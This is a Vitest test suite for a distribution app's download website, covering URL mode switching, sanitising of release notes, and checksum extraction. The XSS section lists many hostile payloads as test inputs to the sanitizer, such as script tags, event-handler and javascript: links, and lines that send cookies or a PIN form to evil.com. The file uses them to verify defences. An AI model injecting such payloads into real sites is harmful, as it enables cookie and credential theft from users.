/**
 * Milestone 2 Challenger 2: Adversarial Stress & Coexistence Test Suite
 *
 * Comprehensive empirical challenges for:
 * 1. URL mode resolution & workspace coexistence invariants
 * 2. XSS & malicious injection payload stress in release notes & UI rendering
 * 3. SHA-256 cryptographic checksum honesty & anti-fabrication invariants
 */

import { describe, it, expect, vi } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { AppInfoCard } from '../components/AppInfoCard';
import { VersionHistory } from '../components/VersionHistory';
import {
  sanitizeReleaseNotes,
  extractSha256Checksum,
} from '../services/sanitizer';
import { ReleaseInfo } from '../types/website';

// Helper to construct mock release
function createTestRelease(overrides: Partial<ReleaseInfo> = {}): ReleaseInfo {
  return {
    id: 9999,
    versionTag: 'v1.0.0',
    title: 'Test Release v1.0.0',
    releaseDate: '2026-11-13T00:00:00Z',
    formattedDate: 'November 13, 2026',
    releaseNotesRaw: 'Default release notes',
    sanitizedNotesHtml: '<p>Default release notes</p>',
    githubReleaseUrl: 'https://github.com/LogarTraders/cold-drink-distribution-app/releases/tag/v1.0.0',
    isPrerelease: false,
    apkAsset: {
      id: 8888,
      filename: 'cold-drink-app.apk',
      sizeBytes: 25000000,
      formattedSize: '23.8 MB',
      downloadUrl: 'https://github.com/LogarTraders/cold-drink-distribution-app/releases/download/v1.0.0/cold-drink-app.apk',
      downloadCount: 50,
      updatedAt: '2026-11-13T00:00:00Z',
    },
    sha256Checksum: null,
    compatibility: {
      minAndroidVersion: 'Android 8.0+',
      targetSdkVersion: 'API 34',
      packageName: 'com.logartraders.distribution',
    },
    ...overrides,
  };
}

describe('Challenger 2 — Adversarial Stress & Coexistence Challenges', () => {

  // =========================================================================
  // Challenge 1: Workspace Coexistence & URL Mode Resolution
  // =========================================================================
  describe('1. URL Mode Resolution & Coexistence Invariants', () => {
    // Mode resolution oracle mirroring src/App.tsx exactly
    function resolveModeFromLocation(win: any): 'website' | 'pos' {
      if (typeof win !== 'undefined' && win !== null) {
        const params = new URLSearchParams(win.location?.search || '');
        const paramMode = params.get('app');
        if (paramMode === 'pos') return 'pos';
        if (paramMode === 'website') return 'website';
        if (win.location?.hash === '#pos') return 'pos';
        if (win.__TAURI_INTERNALS__ || win.__TAURI__) return 'pos';
      }
      return 'website';
    }

    it('CHAL-URL-01: Clean URL without query or hash resolves to website mode', () => {
      const mockWin = {
        location: { search: '', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-02: ?app=pos resolves to pos mode', () => {
      const mockWin = {
        location: { search: '?app=pos', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('pos');
    });

    it('CHAL-URL-03: #pos hash resolves to pos mode', () => {
      const mockWin = {
        location: { search: '', hash: '#pos' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('pos');
    });

    it('CHAL-URL-04: ?app=website explicitly resolves to website mode', () => {
      const mockWin = {
        location: { search: '?app=website', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-05: Conflicting states: ?app=website overrides #pos hash', () => {
      const mockWin = {
        location: { search: '?app=website', hash: '#pos' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-06: Conflicting states: ?app=pos overrides non-pos hash', () => {
      const mockWin = {
        location: { search: '?app=pos', hash: '#download' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('pos');
    });

    it('CHAL-URL-07: Duplicate query params: ?app=pos&app=website picks first param', () => {
      const mockWin = {
        location: { search: '?app=pos&app=website', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('pos');
    });

    it('CHAL-URL-08: Unknown query param value falls back to website mode', () => {
      const mockWin = {
        location: { search: '?app=billing', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-09: Case sensitivity: ?app=POS does not match lowercase pos, falls back to website', () => {
      const mockWin = {
        location: { search: '?app=POS', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-10: Desktop Tauri detection without params resolves to pos mode', () => {
      const mockWin = {
        location: { search: '', hash: '' },
        __TAURI_INTERNALS__: {},
      };
      expect(resolveModeFromLocation(mockWin)).toBe('pos');
    });

    it('CHAL-URL-11: Desktop Tauri with ?app=website override respects web portal view', () => {
      const mockWin = {
        location: { search: '?app=website', hash: '' },
        __TAURI_INTERNALS__: {},
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-12: SSR environment (window is undefined) defaults safely to website mode', () => {
      expect(resolveModeFromLocation(undefined)).toBe('website');
      expect(resolveModeFromLocation(null)).toBe('website');
    });

    it('CHAL-URL-13: Empty query param ?app= resolves to website mode', () => {
      const mockWin = {
        location: { search: '?app=', hash: '' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-14: Uppercase hash #POS does not match #pos, resolves to website mode', () => {
      const mockWin = {
        location: { search: '', hash: '#POS' },
      };
      expect(resolveModeFromLocation(mockWin)).toBe('website');
    });

    it('CHAL-URL-15: window.__TAURI__ object resolves to pos mode', () => {
      const mockWin = {
        location: { search: '', hash: '' },
        __TAURI__: {},
      };
      expect(resolveModeFromLocation(mockWin)).toBe('pos');
    });

    it('CHAL-URL-16: POS IPC Guard Invariant — fetchHealth and fetchSettings are NOT triggered in website mode', () => {
      const fetchHealthSpy = vi.fn();
      const fetchSettingsSpy = vi.fn();

      // Mirror src/App.tsx useEffect logic:
      const simulateAppMount = (appMode: 'website' | 'pos') => {
        if (appMode === 'pos') {
          fetchHealthSpy();
          fetchSettingsSpy();
        }
      };

      // In website mode:
      simulateAppMount('website');
      expect(fetchHealthSpy).not.toHaveBeenCalled();
      expect(fetchSettingsSpy).not.toHaveBeenCalled();

      // In pos mode:
      simulateAppMount('pos');
      expect(fetchHealthSpy).toHaveBeenCalledTimes(1);
      expect(fetchSettingsSpy).toHaveBeenCalledTimes(1);
    });
  });

  // =========================================================================
  // Challenge 2: XSS & Injection Stress in Release Notes Pipeline
  // =========================================================================
  describe('2. XSS & Dangerous Markup Neutralization Pipeline', () => {
    const dangerousPayloads = [
      {
        name: 'Classic script tag',
        payload: '<script>alert("xss")</script>Release Notes Content',
      },
      {
        name: 'Nested obfuscated script tag',
        payload: '<scr<script>ipt>alert(1)</script>Safe Notes',
      },
      {
        name: 'Image tag with onerror attribute',
        payload: '<img src="invalid-image" onerror="alert(\'pwned\')" />',
      },
      {
        name: 'Image tag with unquoted/malformed onerror',
        payload: '<img src=x onerror=alert(1)>',
      },
      {
        name: 'SVG tag with onload attribute',
        payload: '<svg onload="alert(\'svg-xss\')"><circle r="10"/></svg>',
      },
      {
        name: 'SVG with embedded script',
        payload: '<svg><script>document.location="http://evil.com"</script></svg>',
      },
      {
        name: 'Anchor with direct javascript: scheme',
        payload: '<a href="javascript:alert(document.cookie)">Click to Update</a>',
      },
      {
        name: 'Anchor with entity-encoded javascript: scheme',
        payload: '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">Click</a>',
      },
      {
        name: 'Anchor with decimal entity-encoded javascript: scheme',
        payload: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">Click</a>',
      },
      {
        name: 'Anchor with tab-interleaved javascript: scheme',
        payload: '<a href="jav&#x09;ascript:alert(1)">Click</a>',
      },
      {
        name: 'Anchor with percent-encoded javascript: scheme',
        payload: '<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">Click</a>',
      },
      {
        name: 'Anchor with vbscript: scheme',
        payload: '<a href="vbscript:msgbox(1)">Click</a>',
      },
      {
        name: 'Anchor with data: HTML scheme',
        payload: '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
      },
      {
        name: 'Markdown link with javascript: URI',
        payload: '[Click Here For Free APK](javascript:alert("hacked"))',
      },
      {
        name: 'Markdown link with data: URI',
        payload: '[Exploit](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
      },
      {
        name: 'Iframe injection',
        payload: '<iframe src="javascript:alert(1)"></iframe>',
      },
      {
        name: 'Style tag with expression/behavior injection',
        payload: '<style>body { background: url("javascript:alert(1)"); }</style>',
      },
      {
        name: 'Inline event handlers on safe tags (div, span, b)',
        payload: '<div onmouseover="alert(1)" onclick="alert(2)">Hover me</div>',
      },
      {
        name: 'Malformed slash inside tag',
        payload: '<img/src=x/onerror=alert(1)>',
      },
      {
        name: 'Form and input hijacking',
        payload: '<form action="http://evil.com/steal"><input name="pin" value="1234"/><button type="submit">Submit</button></form>',
      },
      {
        name: 'Base tag hijacking',
        payload: '<base href="https://attacker.com/evil/">',
      },
      {
        name: 'Object tag injection',
        payload: '<object data="javascript:alert(1)"></object>',
      },
      {
        name: 'Embed tag injection',
        payload: '<embed src="https://attacker.com/exploit.swf">',
      },
      {
        name: 'MathML tag injection',
        payload: '<math><mtext><mglyph><style><!--</style><img src=x onerror=alert(1)></mglyph></mtext></math>',
      },
      {
        name: 'Null-byte obfuscated javascript scheme',
        payload: '<a href="jav\0ascript:alert(1)">Null-byte link</a>',
      },
    ];

    dangerousPayloads.forEach(({ name, payload }, idx) => {
      it(`CHAL-XSS-${String(idx + 1).padStart(2, '0')}: Neutralizes ${name}`, () => {
        const sanitized = sanitizeReleaseNotes(payload);

        // Security Invariants:
        expect(sanitized).not.toMatch(/<script\b/i);
        expect(sanitized).not.toMatch(/<\/script>/i);
        expect(sanitized).not.toMatch(/<svg\b/i);
        expect(sanitized).not.toMatch(/<\/svg>/i);
        expect(sanitized).not.toMatch(/<iframe\b/i);
        expect(sanitized).not.toMatch(/<style\b/i);
        expect(sanitized).not.toMatch(/\bon[a-zA-Z]+\s*=/i); // zero on* event handlers
        expect(sanitized).not.toMatch(/href\s*=\s*["']?javascript:/i);
        expect(sanitized).not.toMatch(/href\s*=\s*["']?vbscript:/i);
        expect(sanitized).not.toMatch(/href\s*=\s*["']?data:text\/html/i);
      });
    });

    it('CHAL-XSS-UI-01: End-to-end rendering in AppInfoCard eliminates executable markup', () => {
      const maliciousBody = `
# Release Notes v1.2.0
* Added cooler feature
<img src="x" onerror="alert(document.domain)" />
<script>window.__PWNED__ = true;</script>
[Official Mirror](javascript:void(0))
      `;

      const sanitized = sanitizeReleaseNotes(maliciousBody);
      const testRelease = createTestRelease({
        versionTag: 'v1.2.0',
        releaseNotesRaw: maliciousBody,
        sanitizedNotesHtml: sanitized,
      });

      const markup = renderToStaticMarkup(
        <AppInfoCard latestRelease={testRelease} status="success" />
      );

      // Verify rendered HTML
      expect(markup).not.toContain('<script');
      expect(markup).not.toContain('onerror');
      expect(markup).not.toContain('javascript:');
      expect(markup).toContain('Added cooler feature');
      expect(markup).toContain('Release Notes');
    });

    it('CHAL-XSS-UI-02: End-to-end rendering in VersionHistory eliminates executable markup', () => {
      const maliciousBody = `
* Performance improvement
<svg onload="fetch('http://evil.com/'+document.cookie)"></svg>
<a href="vbscript:run()">VBScript</a>
      `;

      const sanitized = sanitizeReleaseNotes(maliciousBody);
      const testRelease = createTestRelease({
        versionTag: 'v1.1.0',
        releaseNotesRaw: maliciousBody,
        sanitizedNotesHtml: sanitized,
      });

      const markup = renderToStaticMarkup(
        <VersionHistory releases={[testRelease]} status="success" />
      );

      expect(sanitized).not.toContain('<svg');
      expect(markup).not.toContain('onload');
      expect(markup).not.toContain('vbscript:');
      expect(markup).not.toMatch(/<svg\b[^>]*\bonload/i);
      expect(markup).toContain('Performance improvement');
    });
    it('CHAL-XSS-CODE-01: Markdown code block containing <script> is safely escaped as text and not executed', () => {
      const codeBlock = "```\n<script>alert('in code block')</script>\n```";
      const sanitized = sanitizeReleaseNotes(codeBlock);
      expect(sanitized).toContain('&lt;script&gt;');
      expect(sanitized).not.toContain('<script>');
    });
  });

  // =========================================================================
  // Challenge 3: SHA-256 Checksum & Anti-Fabrication Invariants
  // =========================================================================
  describe('3. Checksum & Anti-Fabrication Invariants', () => {
    it('CHAL-SHA-01: Null, empty, and whitespace checksum inputs strictly return null', () => {
      expect(extractSha256Checksum(null)).toBeNull();
      expect(extractSha256Checksum('')).toBeNull();
      expect(extractSha256Checksum('   \n\t   ')).toBeNull();
    });

    it('CHAL-SHA-02: Release notes without checksum strictly return null (no fake generation)', () => {
      const bodyWithoutHash = `
## What's Changed
* Bug fixes in cold storage dispatch
* Updated packaging matrix
* Built with Android Gradle Plugin 8.1
      `;
      expect(extractSha256Checksum(bodyWithoutHash)).toBeNull();
    });

    it('CHAL-SHA-03: Truncated 63-hex string does not match SHA-256', () => {
      const shortHex = 'a'.repeat(63);
      expect(extractSha256Checksum(shortHex)).toBeNull();
      expect(extractSha256Checksum(`SHA-256: ${shortHex}`)).toBeNull();
    });

    it('CHAL-SHA-04: Non-hexadecimal 64-character strings are rejected', () => {
      const nonHexG = 'g'.repeat(64);
      const nonHexZ = 'z'.repeat(64);
      expect(extractSha256Checksum(nonHexG)).toBeNull();
      expect(extractSha256Checksum(nonHexZ)).toBeNull();
      expect(extractSha256Checksum(`checksum: ${nonHexG}`)).toBeNull();
    });

    it('CHAL-SHA-05: MD5 (32 hex) and SHA-1 (40 hex) are rejected', () => {
      const md5 = '5d41402abc4b2a76b9719d911017c592';
      const sha1 = '2fd4e1c67a2d28fced849ee1bb76e7391b93eb12';
      expect(extractSha256Checksum(`MD5: ${md5}`)).toBeNull();
      expect(extractSha256Checksum(`SHA-1: ${sha1}`)).toBeNull();
    });

    it('CHAL-SHA-06: Genuine 64-hex SHA-256 is correctly extracted and normalized to lowercase', () => {
      const validHash = 'E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855';
      const body = `Verification: SHA-256: ${validHash}`;
      const extracted = extractSha256Checksum(body);
      expect(extracted).toBe(validHash.toLowerCase());
      expect(extracted).toHaveLength(64);
    });

    it('CHAL-SHA-07: In AppInfoCard, absent checksum strictly renders "Not provided" and hides copy button', () => {
      const releaseWithoutChecksum = createTestRelease({
        sha256Checksum: null,
      });

      const markup = renderToStaticMarkup(
        <AppInfoCard latestRelease={releaseWithoutChecksum} status="success" />
      );

      // Must display "Not provided" for checksum
      expect(markup).toContain('Not provided');
      // Must NOT render copy button
      expect(markup).not.toContain('Copy Checksum');
      // Must NOT render SHA-256 Verified badge
      expect(markup).not.toContain('SHA-256 Verified');
    });

    it('CHAL-SHA-08: In AppInfoCard, verified genuine checksum renders code and copy button', () => {
      const genuineHash = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
      const releaseWithChecksum = createTestRelease({
        sha256Checksum: genuineHash,
      });

      const markup = renderToStaticMarkup(
        <AppInfoCard latestRelease={releaseWithChecksum} status="success" />
      );

      // Must display the checksum
      expect(markup).toContain(genuineHash);
      // Must render copy button
      expect(markup).toContain('Copy Checksum');
      // Must render SHA-256 Verified badge
      expect(markup).toContain('SHA-256 Verified');
    });

    it('CHAL-SHA-09: Word boundary rejection when 64-hex string is embedded within a longer alphanumeric token', () => {
      const valid64 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
      const prefixed = `commit_${valid64}`;
      const suffixed = `${valid64}_build`;

      expect(extractSha256Checksum(prefixed)).toBeNull();
      expect(extractSha256Checksum(suffixed)).toBeNull();
    });

    it('CHAL-SHA-10: SHA-256 formatted inside markdown table is parsed accurately', () => {
      const valid64 = '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8';
      const table = `
| Asset | Checksum |
|---|---|
| cold-drink.apk | ${valid64} |
      `;
      expect(extractSha256Checksum(table)).toBe(valid64);
    });

    it('CHAL-SHA-11: SHA-256 enclosed in backticks or quotes is extracted cleanly without formatting markers', () => {
      const valid64 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
      const backticks = `SHA-256: \`${valid64}\``;
      const quotes = `checksum="${valid64}"`;

      expect(extractSha256Checksum(backticks)).toBe(valid64);
      expect(extractSha256Checksum(quotes)).toBe(valid64);
    });
  });
});
